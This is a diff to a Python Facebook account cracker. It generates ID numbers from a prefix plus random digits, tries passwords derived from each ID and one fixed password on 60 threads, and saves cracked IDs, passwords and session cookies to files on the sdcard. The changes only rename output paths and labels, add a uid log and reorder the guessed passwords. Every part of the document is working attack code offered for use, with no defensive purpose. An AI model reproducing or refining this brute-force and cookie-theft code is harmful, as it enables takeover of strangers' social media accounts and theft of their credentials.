@@ -311,22 +311,24 @@ def cracker(ids,passlist):
                 if 'Photoshop' in res:
                     final = session.get('https://m.facebook.com/home.php', allow_redirects=True)
                     if "confirmemail.php" in (response.url +  final.url):
-                        print('\033[1;92m [NV] '+user+' | '+pas+'')
+                        print('\033[1;92m [sumon-NV] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/SUMON-FILE/NOVERY.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        nvs.append(ids)
+                        open("/sdcard/BITHI/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
+                        oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [OK] '+user+' | '+pas+'')
+                        print('\033[1;92m [sumon-OK] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/SUMON-FILE/COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
                 print('\033[1;91m [sumon-CP] '+ids+' | '+pas+'')
-                open('/sdcard/SUMON-FILE/CP.txt', 'a').write( ids+' | '+pas+'\n')
+                open('/sdcard/BITHI/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
@@ -337,23 +339,24 @@ def cracker(ids,passlist):
         #print(f"\nError: {e}")
         pass
 
+
 def mainn():
     os.system('clear')
     print(logo)
     code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ') 
-    limit = input(f'{Y}[{W}~{Y}] {G}Total limit {W}: ')
+    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
     for a in range(int(limit)):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
     with ThreadPoolExecutor(max_workers=60) as Submits:
-        print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") 
+        print(47*"\x1b[1;97m—") 
         for next in gen:
             ids = code + next
             mk = ids[:6]
             xx = ids[:7]
             v = ids[:8]
             b = next[:6]  
-            passlist = [mk,v,'57273200',xx]
+            passlist = [mk,xx,'57273200',v]
             Submits.submit(crackerr,ids,passlist)
 
 def convert(cookie):
@@ -432,22 +435,24 @@ def crackerr(ids,passlist):
                 if 'Photoshop' in res:
                     final = session.get('https://m.facebook.com/home.php', allow_redirects=True)
                     if "confirmemail.php" in (response.url +  final.url):
-                        print('\033[1;92m [NV] '+user+' | '+pas+'')
+                        print('\033[1;92m [sumon-NV] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/SUMON-FILE/NOVERY.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [OK] '+user+' | '+pas+'')
+                        print('\033[1;92m [sumon-OK] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/SUMON-FILE/COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [sumon-CP] '+cid+' | '+pas+'')
-                open('/sdcard/SUMON-FILE/CP.txt', 'a').write( ids+' | '+pas+'\n')
+                print('\033[1;91m [sumon-CP] '+ids+' | '+pas+'')
+                open('/sdcard/BITHI/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
